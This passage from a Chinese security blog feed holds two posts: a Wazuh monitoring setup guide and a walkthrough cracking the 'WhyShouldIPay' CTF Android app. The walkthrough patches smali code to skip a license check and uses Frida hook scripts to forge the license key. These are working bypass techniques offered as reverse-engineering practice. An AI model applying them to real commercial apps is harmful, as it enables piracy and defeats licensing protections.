rel="noopener">https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents</a></p><pre><code>WAZUH_MANAGER=&quot;192.168.120.128&quot; apt-get install wazuh-agent   //wazuh-api地址,多个服务使用逗号分隔</code></pre><p>或者下载软件包安装，使用脚本注册</p><p><a href="https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb" target="_blank" rel="noopener">https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb</a></p><pre><code>#!/bin/bash####  Shell script for registering agents automatically with the API#  Copyright (C) 2017 Wazuh, Inc. All rights reserved.#  Wazuh.com##  This program is a free software; you can redistribute it#  and/or modify it under the terms of the GNU General Public#  License (version 2) as published by the FSF - Free Software#  Foundation.#### Connection variablesAPI_IP=&quot;192.168.120.128&quot;    #wazuh-api 地址API_PORT=&quot;55000&quot;PROTOCOL=&quot;http&quot;USER=&quot;qweasd&quot;PASSWORD=&quot;qweasd&quot;display_help() {cat &lt;&lt;HELP_USAGE    $0  [-h] [-f|--force] [-q|--quiet] [agent]   -h             Show this message.   -f|--force     Force agent removal (if already registered)                  The agent will be re-regitered with a new ID   -s|--silent    Surpress the output while removing the agent   agent          Agent name (if missing we will use the output                  of the hostname command) HELP_USAGE}register_agent() {  # Adding agent and getting Id from manager  echo &quot;&quot;  echo &quot;Adding agent:&quot;  echo &quot;curl -s -u $USER:**** -k -X POST -d &#39;name=$AGENT_NAME&#39; $PROTOCOL://$API_IP:$API_PORT/agents&quot;  API_RESULT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X POST -d &#39;name=&#39;$AGENT_NAME $PROTOCOL://$API_IP:$API_PORT/agents)  echo -e $API_RESULT | grep -q &quot;\&quot;error\&quot;:0&quot; 2&gt;&amp;1  if [ &quot;$?&quot; != &quot;0&quot; ]; then    echo -e $API_RESULT | sed -rn &#39;s/.*&quot;message&quot;:&quot;(.+)&quot;.*/\1/p&#39;    exit 1  fi  # Get agent id and agent key   AGENT_ID=$(echo $API_RESULT | cut -d&#39;:&#39; -f 4 | cut -d &#39;,&#39; -f 1)  AGENT_KEY=$(echo $API_RESULT | cut -d&#39;:&#39; -f 5 | cut -d &#39;}&#39; -f 1)  echo &quot;Agent &#39;$AGENT_NAME&#39; with ID &#39;$AGENT_ID&#39; added.&quot;  echo &quot;Key for agent &#39;$AGENT_ID&#39; received.&quot;  # Importing key  echo &quot;&quot;  echo &quot;Importing authentication key:&quot;  echo &quot;y&quot; | /var/ossec/bin/manage_agents -i $AGENT_KEY  # Restarting agent  echo &quot;&quot;  echo &quot;Restarting:&quot;  echo &quot;&quot;  /var/ossec/bin/ossec-control restart  exit 0}remove_agent() {  echo &quot;Found: $AGENT_ID&quot;  echo &quot;Removing previous registration for &#39;$AGENT_NAME&#39; using ID: $AGENT_ID ...&quot;  # curl -u foo:bar -k -X DELETE &quot;https://127.0.0.1:55000/agents/001  REMOVE_AGENT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X DELETE $PROTOCOL://$API_IP:$API_PORT/agents/$AGENT_ID)  echo -e $REMOVE_AGENT}get_agent_id() {  echo &quot;&quot;  echo &quot;Checking for Agent ID...&quot;  AGENT_ID=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X GET $PROTOCOL://$API_IP:$API_PORT/agents/name/$AGENT_NAME | rev | cut -d: -f1 | rev | grep -o &#39;&quot;.*&quot;&#39; | tr -d &#39;&quot;&#39;)}# MAIN# ENTRY POINTwhile getopts &#39;:hfs&#39; OPTION; do  case &quot;$OPTION&quot; in    h)      display_help      exit 0      ;;    f|--force)      FORCE=true      ;;    s|--silent)      SILENT=true      ;;  esacdone# reset $1, $2 .... as normal argument after the flagshift $(($OPTIND - 1))# if no arguments are passed in after the flags, we assign the hostname value to the AGENT_NAME AGENT_NAME=${1:-$(hostname)}get_agent_id# check the return value. If we get an integer back then the agent is already registered. Anything else -&gt; agent is not registered  if ! [ &quot;$AGENT_ID&quot; -eq &quot;$AGENT_ID&quot; ] 2&gt; /dev/null ; then   echo &quot;Starting registration process ...&quot;   :  elif [[ &quot;$FORCE&quot; = true &amp;&amp; &quot;$SILENT&quot; = &quot;true&quot; ]] ; then   remove_agent &gt; /dev/null 2&gt;&amp;1  else    if [[ &quot;$FORCE&quot; = true ]] ; then      remove_agent    fi  fi# Default action -&gt; try to register the agentregister_agent</code></pre><p>配置好后，访问wazuh界面中的agent就可以看到连接状态了</p><p><img src="https://i.loli.net/2019/12/06/2qjpKxCSPB9aem6.png" alt="1575510859374.png"></p><p>在Inventory data中可以看到主机的网卡，网络连接，软件包等信息。</p><p><img src="https://i.loli.net/2019/12/06/lwyWe3P8dVpBxUc.png" alt="1575511010986.png"></p><p>配置文件 <code>/var/ossec/etc/ossec.conf</code>文件完成性监控，同时需要修改server端的获取时间和配置</p><pre><code>&lt;frequency&gt;43200&lt;/frequency&gt;   #默认为十二小时，此处修改为100秒&lt;!-- File integrity monitoring --&gt;&lt;syscheck&gt;    &lt;disabled&gt;no&lt;/disabled&gt;   #文件完整性监控，默认为no&lt;syscheck&gt;  &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;/tmp&lt;/directories&gt; #实时扫描，仅使用目录&lt;/syscheck&gt;&lt;syscheck&gt;  &lt;frequency&gt;36000&lt;/frequency&gt;              #计划扫描，每十小时一次  &lt;directories&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt;   #计划扫描的目录  &lt;directories&gt;/bin,/sbin&lt;/directories&gt;&lt;/syscheck&gt;&lt;syscheck&gt;                 #包含了实时扫描，同时带有who-data信息  &lt;directories check_all=&quot;yes&quot; whodata=&quot;yes&quot;&gt;/etc&lt;/directories&gt;&lt;/syscheck&gt;&lt;rule id=&quot;100345&quot; level=&quot;12&quot;&gt;   #基于规则检测报警，规则id来自Management/Ruleset  &lt;if_group&gt;syscheck&lt;/if_group&gt;  &lt;match&gt;/var/www/htdocs&lt;/match&gt;  &lt;description&gt;Changes to /var/www/htdocs - Critical file!&lt;/description&gt;&lt;/rule&gt;&lt;directories check_all=&quot;yes&quot;&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt;  #要检查的目录（执行所有可能的验证）&lt;ignore&gt;/etc/mtab&lt;/ignore&gt;   #要忽略的目录</code></pre><p>如果启用了whodata字段，需要执行以下安装</p><pre><code>apt install auditdauditctl -l | grep wazuh_fim  #检查是否应用了用于监视所选文件夹的审核规则：-w /etc -p wa -k wazuh_fim</code></pre><p>命令监控，必须将代理显式配置为接受远程命令，文件<code>/var/ossec/etc/local_internal_options.conf</code></p><pre><code>logcollector.remote_commands=1</code></pre><p>根据文档建议，修改<code>/var/ossec/etc/shared/agent.conf</code>文件，如果包含多个组文件夹，需要到每个组文件夹下修改配置文件，name，os，profile是可以设置。</p><pre><code>&lt;agent_config name=&quot;agent_name&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/my.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config os=&quot;Linux&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/linux.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config profile=&quot;database&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/database.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config name=&quot;kali&quot;&gt;    &lt;localfile&gt;        &lt;log_format&gt;command&lt;/log_format&gt;   #command 指逐行读取        &lt;command&gt;df -P&lt;/command&gt;    &lt;/localfile&gt;    &lt;localfile&gt;        &lt;log_format&gt;full_command&lt;/log_format&gt;  #全部匹配查找        &lt;command&gt;netstat -tan |grep LISTEN |egrep -v &#39;(127.0.0.1| ::1)&#39; | sort&lt;/command&gt;      &lt;/localfile&gt;&lt;/agent_config&gt;</code></pre><p>漏洞检测，需要配置agent端和server端<code>/var/ossec/etc/ossec.conf</code></p><pre><code>agent端&lt;wodle name=&quot;syscollector&quot;&gt;  &lt;disabled&gt;no&lt;/disabled&gt;  &lt;interval&gt;1h&lt;/interval&gt;  &lt;packages&gt;yes&lt;/packages&gt;&lt;/wodle&gt;server端&lt;wodle name=&quot;vulnerability-detector&quot;&gt;  &lt;disabled&gt;no&lt;/disabled&gt;  &lt;interval&gt;5m&lt;/interval&gt;  &lt;run_on_start&gt;yes&lt;/run_on_start&gt;  &lt;feed name=&quot;ubuntu-18&quot;&gt;    &lt;disabled&gt;no&lt;/disabled&gt;    &lt;update_interval&gt;1h&lt;/update_interval&gt;  &lt;/feed&gt;&lt;/wodle&gt;systemctl restart wazuh-manager  #重启</code></pre><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>当然，如果觉得以上安装过于繁琐，可以选择虚拟机安装一个wazuh服务端，仅在64位系统中运行。不建议在生产中直接使用。</p><p><a href="https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova" target="_blank" rel="noopener">https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova</a></p><p>root密码为wazh，api密码为默认的foo/bar。</p><p>安装的Elasticsearch <code>/usr/share/elasticsearch</code>。Filebeat安装在中<code>/usr/share/filebeat</code>，其配置文件位于中<code>/etc/filebeat/filebeat.yml</code>。</p><p>启动服务和重启相关服务</p><pre><code>systemctl restart wazuh-managersystemctl restart wazuh-apisystemctl stop elasticsearchsystemctl start filebeatsystemctl status kibana</code></pre><p>kibana地址为<code>https://IP</code>，在如下界面中即可看到wazuh做的相关配置检查，和建议。此建议开启tcp_syncookies来处理DOS攻击中的SYN握手的资源消耗。</p><p><img src="https://i.loli.net/2019/12/06/iamlXNn75Rphu4O.png" alt="1575601193495.png"></p><p>根据配置文件查看对应配置是否开启，配置默认关闭，根据需求来判断是否开启。</p><p><img src="https://i.loli.net/2019/12/06/V5zTmuawxUJ1jbQ.png" alt="1575601358753.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装Wazuh-manager&quot;&gt;&lt;a href=&quot;#安装Wazuh-manager&quot; class=&quot;headerlink&quot; title=&quot;安装Wazuh manager&quot;&gt;&lt;/a&gt;安装Wazuh manager&lt;/h2&gt;&lt;p&gt;使用Ubuntu系统，目前wazuh
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>Hook WhyShouldIPay</title>
    <link href="/2019/11/Hook-WhyShouldIPay/"/>
    <id>/2019/11/Hook-WhyShouldIPay/</id>
    <published>2019-11-25T09:22:39.000Z</published>
    <updated>2019-11-25T09:24:43.449Z</updated>
    
    <content type="html"><![CDATA[<p>学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>把apk丢到jeb中，从mainfast文件。可以看到首页activity是LauncherActivity。找到首页activity，点击反编译。</p><p><img src="https://i.loli.net/2019/11/25/IAZ45F2iCPJzoWj.png" alt="1574664538019.png"></p><p>从代码中可以看到，其实是做了一次网络验证，但由于时间久远，这个apk貌似是16年的CTF使用，网址现在已经不能使用了。所以需要这里进行修改，利用AK来修改smail代码。重打包安装。</p><pre><code>.method public verifyClick(Landroid/view/View;)V    .locals 15    .line 39    .restart local v1    # &quot;b&quot;:[B    .restart local v2    # &quot;con&quot;:Ljava/net/URLConnection;    .restart local v5    # &quot;in&quot;:Ljava/io/InputStream;    .restart local v9    # &quot;responseBuilder&quot;:Ljava/lang/StringBuilder;    .restart local v11    # &quot;url&quot;:Ljava/net/URL;    :cond_0    const-string v8, &quot;LICENSEKEYOK&quot;    .line 40    #.local v8, &quot;response&quot;:Ljava/lang/String;    const-string v12, &quot;LICENSEKEYOK&quot;    invoke-virtual {v8, v12}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z    move-result v12    if-eqz v12, :cond_1    .line 43    new-instance v0, Ljava/lang/String;    invoke-direct {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getMac()Ljava/lang/String;    move-result-object v12    invoke-virtual {v12}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v12    invoke-virtual {v8}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v13    invoke-static {v12, v13}, Lde/fraunhofer/sit/premiumapp/MainActivity;-&gt;xor([B[B)[B    move-result-object v12    invoke-direct {v0, v12}, Ljava/lang/String;-&gt;&lt;init&gt;([B)V    .line 44    .local v0, &quot;activatedKey&quot;:Ljava/lang/String;    invoke-virtual {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getApplicationContext()Landroid/content/Context;    move-result-object v12    const-string v13, &quot;preferences&quot;    const/4 v14, 0x0    invoke-virtual {v12, v13, v14}, Landroid/content/Context;-&gt;getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;    move-result-object v7    .line 45    .local v7, &quot;pref&quot;:Landroid/content/SharedPreferences;    invoke-interface {v7}, Landroid/content/SharedPreferences;-&gt;edit()Landroid/content/SharedPreferences$Editor;    move-result-object v4    .line 46    .local v4, &quot;editor&quot;:Landroid/content/SharedPreferences$Editor;    const-string v12, &quot;KEY&quot;    invoke-interface {v4, v12, v0}, Landroid/content/SharedPreferences$Editor;-&gt;putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;    .line 47    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;-&gt;commit()Z    .line 48    new-instance v12, Landroid/support/v7/app/AlertDialog$Builder;    invoke-direct {v12, p0}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V    const-string v13, &quot;Activation successful&quot;    .line 49    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const-string v13, &quot;Activation successful&quot;    .line 50    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const v13, 0x1080027    .line 51    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setIcon(I)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    .line 52    invoke-virtual {v12}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;show()Landroid/support/v7/app/AlertDialog;    :cond_1    return-void.end method</code></pre><p>修改如上，重新给v8寄存器赋值。并且删除以上全部请求代码，清楚其他try的代码，不然其做HTTP请求验证。完整的verifyClick函数smail代码如上。至此网络验证的给去掉了。</p><p>点击verify，就会显示验证成功，然后写入本地数据保存key值。</p><p><img src="https://i.loli.net/2019/11/25/FqNsiJSWmjBV6ed.png" alt="1574671361120.png"></p><p>只不过这样修改，再点击premium的时候就是认证成功的了。</p><p><img src="https://i.loli.net/2019/11/25/6HZStIBWULOrNil.png" alt="1574671432194.png"></p><h3 id="Hook-函数"><a href="#Hook-函数" class="headerlink" title="Hook 函数"></a>Hook 函数</h3><p>那么先hook一下getMac和getKey函数，看一下返回是什么值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    lunc.getMac.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);        var ser = this.getKey();        send(ser);        return sed;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>在手机上打开Frida。转发端口27042。运行后获取到两个参数，一个是WiFi的Mac，一个是key。</p><p><img src="https://i.loli.net/2019/11/25/32dClO61LBqKiU5.png" alt="1574671869395.png"></p><p>然后按照修改返回参数来直接达到不修改apk的目的。</p><h3 id="Hook-直接获得结果"><a href="#Hook-直接获得结果" class="headerlink" title="Hook 直接获得结果"></a>Hook 直接获得结果</h3><p>从代码中就可以看到，当返回结果为LICENSEKEYOK时，调用MainActivity类下的xor方法。参数一个是上面的Mac的byte值，一个是LICENSEKEYOK的byte值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){        //字符串转byte        function stringToBytes(str) {              var ch, st, re = [];             for (var i = 0; i &lt; str.length; i++ ) {                 ch = str.charCodeAt(i);  // get char                  st = [];                 // set up &quot;stack&quot;                  do {                      st.push( ch &amp; 0xFF );  // push byte to stack                      ch = ch &gt;&gt; 8;          // shift value down by 1 byte                  }                    while ( ch );                  re = re.concat( st.reverse() );             }              return re;          }         //byte转字符串        function byteToString(arr) {            if(typeof arr === &#39;string&#39;) {                return arr;            }            var str = &#39;&#39;,                _arr = arr;            for(var i = 0; i &lt; _arr.length; i++) {                var one = _arr[i].toString(2),                    v = one.match(/^1+?(?=0)/);                if(v &amp;&amp; one.length == 8) {                    var bytesLength = v[0].length;                    var store = _arr[i].toString(2).slice(7 - bytesLength);                    for(var st = 1; st &lt; bytesLength; st++) {                        store += _arr[st + i].toString(2).slice(2);                    }                    str += String.fromCharCode(parseInt(store, 2));                    i += bytesLength - 1;                } else {                    str += String.fromCharCode(_arr[i]);                }            }            return str;        }    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    var main = Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;);    lunc.getKey.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);                   //获取mac        var xor = main.xor(stringToBytes(sed), stringToBytes(&quot;LICENSEKEYOK&quot;));   //生成key        var ser = byteToString(xor);        send(ser);        return ser;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>执行如上代码，即可Hook到key函数，然后由xor生成，来返回给getKey函数。返回如下所示。</p><p><img src="https://i.loli.net/2019/11/25/D1Z8BlvRaft6rAh.png" alt="1574673463247.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。&lt;/p&gt;
&lt;h3 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
